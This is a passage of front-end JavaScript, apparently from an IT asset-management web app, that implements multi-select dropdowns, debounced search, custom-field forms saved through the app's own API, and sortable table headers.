  const label = n === 0
    ? allLabel
    : (n === 1
      ? (options.find((o) => o.value === selList[0])?.label || selList[0])
      : `${allLabel}`);
  const sel = new Set(selList);
  return `
    <div class="msel" data-msel="${esc(id)}">
      <button type="button" class="msel-btn" aria-haspopup="listbox" aria-expanded="false">
        <span class="msel-label">${esc(label)}</span>
        ${n > 1 ? `<span class="msel-count">${n}</span>` : (n === 1 ? `<span class="msel-count">1</span>` : '')}
        <span class="ms">expand_more</span>
      </button>
      <div class="msel-menu" role="listbox">
        ${options.length === 0
          ? `<div class="msel-empty">No options</div>`
          : options.map((o) => `
            <label>
              <input type="checkbox" value="${esc(o.value)}" ${sel.has(o.value) ? 'checked' : ''}>
              <span>${esc(o.label)}</span>
            </label>`).join('')}
      </div>
    </div>`;
}

/**
 * Debounced list search that survives full-view re-renders (hash navigation).
 * Remember caret before navigate; restore focus after the new input is mounted.
 */
function bindDebouncedSearch(input, { getValue, apply, delay = 400 } = {}) {
  if (!input) return;
  const st = window.__itacmSearchFocus;
  if (st && st.id === input.id) {
    window.__itacmSearchFocus = null;
    requestAnimationFrame(() => {
      input.focus();
      const pos = Math.min(Number(st.pos) || 0, input.value.length);
      try { input.setSelectionRange(pos, pos); } catch { /* ignore */ }
    });
  }
  let timer;
  input.addEventListener('input', () => {
    clearTimeout(timer);
    timer = setTimeout(() => {
      const next = String(input.value || '').trim();
      const cur = String(typeof getValue === 'function' ? (getValue() || '') : '').trim();
      if (next === cur) return;
      window.__itacmSearchFocus = {
        id: input.id,
        pos: input.selectionStart ?? input.value.length,
      };
      apply(next);
    }, delay);
  });
}

function mountMultiSelects(root, onChangeMap) {
  if (!root) return;

  const closeAll = (apply) => {
    root.querySelectorAll('.msel.open').forEach((w) => {
      w.classList.remove('open');
      w.querySelector('.msel-btn')?.setAttribute('aria-expanded', 'false');
      if (apply && w.dataset.dirty === '1') {
        w.dataset.dirty = '0';
        const key = w.dataset.msel;
        const menu = w.querySelector('.msel-menu');
        const vals = [...menu.querySelectorAll('input[type="checkbox"]:checked')].map((c) => c.value);
        const fn = onChangeMap[key];
        if (fn) fn(vals);
      }
    });
  };

  root.querySelectorAll('.msel').forEach((wrap) => {
    const btn = wrap.querySelector('.msel-btn');
    const menu = wrap.querySelector('.msel-menu');
    if (!btn || !menu) return;

    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const willOpen = !wrap.classList.contains('open');
      closeAll(true);
      if (willOpen) {
        wrap.classList.add('open');
        btn.setAttribute('aria-expanded', 'true');
      }
    });

    menu.addEventListener('click', (e) => e.stopPropagation());

    menu.querySelectorAll('input[type="checkbox"]').forEach((cb) => {
      cb.addEventListener('change', () => {
        wrap.dataset.dirty = '1';
        const vals = [...menu.querySelectorAll('input[type="checkbox"]:checked')].map((c) => c.value);
        const countEl = btn.querySelector('.msel-count');
        const labelEl = btn.querySelector('.msel-label');
        if (vals.length === 0) {
          if (countEl) countEl.remove();
        } else if (countEl) {
          countEl.textContent = String(vals.length);
        } else {
          const span = document.createElement('span');
          span.className = 'msel-count';
          span.textContent = String(vals.length);
          labelEl?.after(span);
        }
      });
    });
  });

  if (!mountMultiSelects._docBound) {
    mountMultiSelects._docBound = true;
    document.addEventListener('click', () => {
      document.querySelectorAll('.msel.open').forEach((w) => {
        w.dispatchEvent(new CustomEvent('msel-close-request'));
      });
    });
  }

  root.querySelectorAll('.msel').forEach((wrap) => {
    wrap.addEventListener('msel-close-request', () => {
      if (!wrap.classList.contains('open')) return;
      wrap.classList.remove('open');
      wrap.querySelector('.msel-btn')?.setAttribute('aria-expanded', 'false');
      if (wrap.dataset.dirty === '1') {
        wrap.dataset.dirty = '0';
        const key = wrap.dataset.msel;
        const menu = wrap.querySelector('.msel-menu');
        const vals = [...menu.querySelectorAll('input[type="checkbox"]:checked')].map((c) => c.value);
        const fn = onChangeMap[key];
        if (fn) fn(vals);
      }
    });
  });
}

/** ---------- Custom fields (Integrations → used on asset / employee / contract forms) ---------- */

async function fetchCustomFields(entity, entityId) {
  const [defs, values] = await Promise.all([
    api(`/integrations/custom-fields/${entity}`).catch(() => []),
    entityId
      ? api(`/integrations/custom-fields/${entity}/${entityId}/values`).catch(() => ({}))
      : Promise.resolve({}),
  ]);
  return {
    defs: Array.isArray(defs) ? defs : [],
    values: values && typeof values === 'object' ? values : {},
  };
}

function renderCustomFieldsHtml(defs, values = {}) {
  if (!defs || !defs.length) return '';
  const fields = defs.map((d) => {
    const key = d.fieldKey;
    const val = values[key] != null ? String(values[key]) : '';
    const req = d.required ? 'required' : '';
    const opts = Array.isArray(d.options) ? d.options : [];
    let control;
    if (d.fieldType === 'select' && opts.length) {
      const known = !val || opts.map(String).includes(val);
      control = `<select name="cf__${esc(key)}" data-cf-key="${esc(key)}" ${req}>
        <option value="">—</option>
        ${known ? '' : `<option value="${esc(val)}" selected>${esc(val)}</option>`}
        ${opts.map((o) => `<option value="${esc(o)}" ${val === String(o) ? 'selected' : ''}>${esc(o)}</option>`).join('')}
      </select>`;
    } else if (d.fieldType === 'date') {
      control = `<input type="date" name="cf__${esc(key)}" data-cf-key="${esc(key)}" value="${esc(val)}" ${req}>`;
    } else if (d.fieldType === 'number') {
      control = `<input type="number" name="cf__${esc(key)}" data-cf-key="${esc(key)}" value="${esc(val)}" ${req}>`;
    } else {
      // text, or select without options yet — free text so the field is still usable
      control = `<input type="text" name="cf__${esc(key)}" data-cf-key="${esc(key)}" value="${esc(val)}" ${req}
        placeholder="${d.fieldType === 'select' && !opts.length ? 'Add options under Integrations' : ''}">`;
    }
    return `<div class="form-field"><label>${esc(d.label)}${d.required ? ' *' : ''}
      <span class="ob-hint mono">(${esc(key)})</span></label>${control}</div>`;
  }).join('');
  return `
    <div class="form-field full" style="margin-top:4px;padding-top:10px;border-top:1px solid var(--border,#e8e6f0)">
      <h4 style="margin:0 0 4px;font-size:13px">Custom fields</h4>
      <p class="cell-sub" style="margin:0">From Integrations · labels appear when creating or editing this record.</p>
    </div>
    ${fields}`;
}

function collectCustomFieldValues(root, defs) {
  const out = {};
  if (!defs || !defs.length) return out;
  for (const d of defs) {
    const input = root.querySelector(`[data-cf-key="${CSS.escape ? CSS.escape(d.fieldKey) : d.fieldKey}"]`)
      || root.querySelector(`[name="cf__${d.fieldKey}"]`);
    out[d.fieldKey] = input ? String(input.value || '').trim() : '';
  }
  return out;
}

/** Map defs+values into formModal field descriptors (employee / contract). */
function customFieldsAsFormFields(defs, values = {}) {
  return (defs || []).map((d) => {
    const opts = Array.isArray(d.options) ? d.options : [];
    const base = {
      name: `cf__${d.fieldKey}`,
      label: `${d.label}${d.required ? ' *' : ''} (${d.fieldKey})`,
      required: !!d.required,
      value: values[d.fieldKey] != null ? values[d.fieldKey] : '',
    };
    if (d.fieldType === 'select' && opts.length) {
      return {
        ...base,
        type: 'select',
        options: [{ value: '', label: '—' }, ...opts.map((o) => ({ value: o, label: o }))],
      };
    }
    if (d.fieldType === 'date') return { ...base, type: 'date' };
    if (d.fieldType === 'number') return { ...base, type: 'number' };
    return { ...base, type: 'text' };
  });
}

function peelCustomFieldPayload(data, defs) {
  const values = {};
  const cleaned = { ...data };
  for (const d of defs || []) {
    const k = `cf__${d.fieldKey}`;
    if (k in cleaned) {
      values[d.fieldKey] = cleaned[k] != null ? String(cleaned[k]).trim() : '';
      delete cleaned[k];
    }
  }
  return { body: cleaned, values };
}

async function saveCustomFieldValues(entity, entityId, values) {
  if (!entityId || !values || typeof values !== 'object') return;
  await api(`/integrations/custom-fields/${entity}/${entityId}/values`, {
    method: 'PUT',
    body: values,
  });
}

function customFieldsDetailHtml(defs, values = {}) {
  if (!defs || !defs.length) return '';
  const rows = defs.map((d) => {
    const v = values[d.fieldKey];
    if (v == null || String(v).trim() === '') return '';
    return `<div><span class="cell-sub">${esc(d.label)}</span><div>${esc(v)}</div></div>`;
  }).filter(Boolean);
  if (!rows.length) return '';
  return `<div class="full"><span class="cell-sub">Custom fields</span></div>${rows.join('')}`;
}

/* ---------- Shared column sorting (hardware list, assign pickers, …) ---------- */

/** Locale + numeric compare for A→Z / 1→9 (and desc). */
function localeCmp(a, b) {
  return String(a ?? '').localeCompare(String(b ?? ''), undefined, { numeric: true, sensitivity: 'base' });
}

/**
 * Clickable sortable `<th>` matching the hardware inventory pattern.
 * Uses `data-sort` / `data-order` on the button for handlers.
 */
function sortThHtml(key, label, sortKey, sortOrder, extraClass = '') {
  const active = sortKey === key;
  const icon = !active ? 'unfold_more' : (sortOrder === 'desc' ? 'arrow_downward' : 'arrow_upward');
  const nextOrder = active && sortOrder === 'asc' ? 'desc' : 'asc';
  const aria = active
    ? (sortOrder === 'asc' ? (t('hw.sortAsc') || 'Sorted ascending') : (t('hw.sortDesc') || 'Sorted descending'))
    : `${t('hw.sortBy') || 'Sort by'} ${label}`;
  const cls = ['hw-col-sort', extraClass, active ? 'is-sorted' : ''].filter(Boolean).join(' ');
  return `<th class="${cls}" aria-sort="${active ? (sortOrder === 'asc' ? 'ascending' : 'descending') : 'none'}">
    <button type="button" class="th-sort${active ? ' is-active' : ''}" data-sort="${esc(key)}" data-order="${esc(nextOrder)}" title="${esc(aria)}" aria-label="${esc(aria)}">
      <span>${esc(label)}</span>
      <span class="ms sort-ind" aria-hidden="true">${icon}</span>
    </button>
  </th>`;
}

/**
 * Stable client-side sort. `getValue(item, key)` returns the compare string/number.
 * Optional `tieKey` (string field or fn) breaks ties.
 */
function sortByKey(list, key, order, getValue, tieKey = null) {
  const mul = order === 'desc' ? -1 : 1;
  const tieOf = (row) => {
    if (!tieKey) return '';
    if (typeof tieKey === 'function') return tieKey(row);
    return row[tieKey];
  };
  return (list || []).slice().sort((a, b) => {
    const c = localeCmp(getValue(a, key), getValue(b, key));
    if (c) return c * mul;
    return localeCmp(tieOf(a), tieOf(b)) * mul;
  });
}

/** Common asset field extractor for inventory / assign pickers. */
function assetFieldSortValue(x, key) {
  switch (key) {
    case 'brand':
    case 'name':
      return `${x.brand || ''} ${x.model || ''}`.trim().toLowerCase();
    case 'category':
      return String(x.category || '').toLowerCase();
    case 'serialNumber':
      return String(x.serialNumber || '').toLowerCase();
    case 'tagSn':
      return `${x.assetTag || ''} ${x.serialNumber || ''}`.trim().toLowerCase();
    case 'mac':
      return String(x.macEthernet || x.macWifi || '').toLowerCase();
    case 'location':
      return String(x.location || '').toLowerCase();
    case 'status':
      return String(x.status || '').toLowerCase();
    case 'assetTag':
    default:
      return String(x.assetTag || '').toLowerCase();
  }
}

function lineFieldSortValue(l, key) {
  switch (key) {
    case 'operator':
      return String(l.operator || '').toLowerCase();
    case 'plan':
      return String(l.plan || '').toLowerCase();
    case 'simSerial':
      return String(l.simSerial || '').toLowerCase();
    case 'phoneNumber':
    default:
      return String(l.phoneNumber || '').toLowerCase();
  }
}

/** Wire `.th-sort` clicks inside `root`; `onSort(key, order)` receives next sort. */
function bindSortHeaders(root, onSort) {
  if (!root || typeof onSort !== 'function') return;
  root.addEventListener('click', (e) => {
    const btn = e.target.closest('button.th-sort');
    if (!btn || !root.contains(btn)) return;
    e.preventDefault();
    e.stopPropagation();
    const key = btn.dataset.sort;
    const order = btn.dataset.order === 'desc' ? 'desc' : 'asc';
    if (key) onSort(key, order);
  });
}

/* ---- Shared clickable table-header sorting ---- */
function tableSortLoad(storageKey, allowed, fallback) {
  const fb = fallback || { sort: 'name', order: 'asc' };
  try {
    const raw = JSON.parse(localStorage.getItem(storageKey) || 'null');
    if (raw && allowed.has(raw.sort)) {
      return { sort: raw.sort, order: raw.order === 'desc' ? 'desc' : 'asc' };
    }
  } catch { /* private mode */ }
  return { sort: fb.sort, order: fb.order === 'desc' ? 'desc' : 'asc' };
}

function tableSortSave(storageKey, sort, order) {
  try { localStorage.setItem(storageKey, JSON.stringify({ sort, order })); } catch { /* ignore */ }
}

function tableSortResolve(params, { allowed, storageKey, defaultSort, defaultOrder }) {
  const pref = tableSortLoad(storageKey, allowed, { sort: defaultSort, order: defaultOrder || 'asc' });
  const sort = allowed.has(params && params.sort) ? params.sort : pref.sort;
  const order = (params && (params.order === 'asc' || params.order === 'desc'))
    ? params.order
    : ((params && params.sort) ? 'asc' : pref.order);
  return { sort, order };
}

function tableSortNext(active, currentOrder) {
  return active && currentOrder === 'asc' ? 'desc' : 'asc';
}

function tableSortToggle(state, clickedKey) {
  const active = state.sort === clickedKey;
  return { sort: clickedKey, order: tableSortNext(active, state.order) };
}

/** HTML for a sortable <th> button. */
function tableSortTh(key, label, { sort, order, extraClass = '', scope = '' } = {}) {
  const active = sort === key;
  const icon = !active ? 'unfold_more' : (order === 'desc' ? 'arrow_downward' : 'arrow_upward');
  const nextOrder = tableSortNext(active, order);
  const aria = active
    ? (order === 'asc' ? (t('hw.sortAsc') || 'Sorted ascending') : (t('hw.sortDesc') || 'Sorted descending'))
    : `${t('hw.sortBy') || 'Sort by'} ${label}`;
  const cls = ['col-sort', extraClass, active ? 'is-sorted' : ''].filter(Boolean).join(' ');
  const scopeAttr = scope ? ` data-sort-scope="${esc(scope)}"` : '';
  return `<th class="${cls}" aria-sort="${active ? (order === 'asc' ? 'ascending' : 'descending') : 'none'}">
    <button type="button" class="th-sort${active ? ' is-active' : ''}" data-sort="${esc(key)}" data-order="${esc(nextOrder)}"${scopeAttr} title="${esc(aria)}" aria-label="${esc(aria)}">
      <span>${esc(label)}</span>
      <span class="ms sort-ind" aria-hidden="true">${icon}</span>
    </button>
  </th>`;
}

function tableSortCmp(va, vb, type) {
  if (type === 'number') {
    const na = Number(va); const nb = Number(vb);
    const aOk = Number.isFinite(na); const bOk = Number.isFinite(nb);
    if (aOk && bOk) return na - nb;
    if (aOk) return -1;
    if (bOk) return 1;
    return 0;
  }
  if (type === 'date') {
    const ta = va ? new Date(va).getTime() : NaN;
    const tb = vb ? new Date(vb).getTime() : NaN;
    const aOk = Number.isFinite(ta); const bOk = Number.isFinite(tb);
    if (aOk && bOk) return ta - tb;
    if (aOk) return -1;
    if (bOk) return 1;
    return 0;
  }
  return String(va == null ? '' : va).localeCompare(String(vb == null ? '' : vb), undefined, {
    numeric: true, sensitivity: 'base',
  });
}

/**
 * Sort a list by column key.
 * getters: { key: (row) => value } or { key: { get, type } }
 */
function tableSortBy(list, key, order, getters) {
  const spec = getters[key] || getters._default;
  if (!spec) return list.slice();
  const get = typeof spec === 'function' ? spec : spec.get;
  const type = typeof spec === 'function' ? 'text' : (spec.type || 'text');
  const mul = order === 'desc' ? -1 : 1;
  const tie = getters._tie || ((r) => String(r.id || ''));
  return list.slice().sort((a, b) => {
    const c = tableSortCmp(get(a), get(b), type);
    if (c) return c * mul;
    return tableSortCmp(tie(a), tie(b), 'text') * mul;
  });
}
